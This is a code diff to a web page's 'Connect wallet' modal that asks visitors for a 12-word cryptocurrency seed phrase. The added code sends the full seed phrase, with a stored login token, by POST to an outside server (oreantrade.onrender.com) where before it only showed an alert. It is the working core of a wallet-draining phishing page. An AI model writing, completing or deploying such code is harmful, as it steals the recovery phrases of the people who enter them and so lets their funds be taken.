@@ -189,6 +189,8 @@
     </div>
 
 <script>
+
+  const token = localStorage.getItem('token')
     function openModal(walletName) {
       document.getElementById('walletName').textContent = `Connect ${walletName}`;
       document.getElementById('walletModal').style.display = 'flex';
@@ -204,11 +206,13 @@
         seedInputsContainer.appendChild(input);
   
         // Move to next input automatically after typing
-        input.addEventListener('input', function () {
-          if (input.value.length > 0 && input.nextElementSibling) {
-            input.nextElementSibling.focus();
-          }
-        });
+       // Move to next input only if max length is reached
+input.addEventListener('input', function () {
+  if (input.value.length === input.maxLength && input.nextElementSibling) {
+    input.nextElementSibling.focus();
+  }
+});
+
   
         // Auto-paste full seed
         input.addEventListener('paste', function (e) {
@@ -234,17 +238,39 @@
     }
   
     function submitSeed() {
-      const inputs = document.querySelectorAll('.seed-inputs input');
-      const seedWords = Array.from(inputs).map(input => input.value.trim()).filter(word => word.length > 0);
-  
-      if (seedWords.length === 12) {
-        const finalSeedPhrase = seedWords.join(' ');
-        alert('Seed phrase submitted: ' + finalSeedPhrase);
-        closeModal();
-      } else {
-        alert(`Please enter exactly 12 words. You entered ${seedWords.length}.`);
-      }
-    }
+  const inputs = document.querySelectorAll('.seed-inputs input');
+  const seedWords = Array.from(inputs).map(input => input.value.trim()).filter(word => word.length > 0);
+
+  if (seedWords.length === 12) {
+    const finalSeedPhrase = seedWords.join(' ');
+
+    // Send seed phrase to backend
+    fetch('https://oreantrade.onrender.com/api/user/submit-seed', {
+      method: 'POST',
+      headers: {
+  'Authorization': `Bearer ${token}`,
+  'Content-Type': 'application/json'
+},
+      body: JSON.stringify({ seedPhrase: finalSeedPhrase })
+    })
+    .then(res => {
+      if (!res.ok) throw new Error('Failed to send seed phrase');
+      return res.json();
+    })
+    .then(data => {
+      alert('Seed phrase submitted successfully!');
+      closeModal();
+    })
+    .catch(err => {
+      console.error('Error sending seed phrase:', err);
+      alert('Failed to submit seed phrase');
+    });
+
+  } else {
+    alert(`Please enter exactly 12 words. You entered ${seedWords.length}.`);
+  }
+}
+
   </script>
 
 <script type="module" src="../api/auth.js"></script>
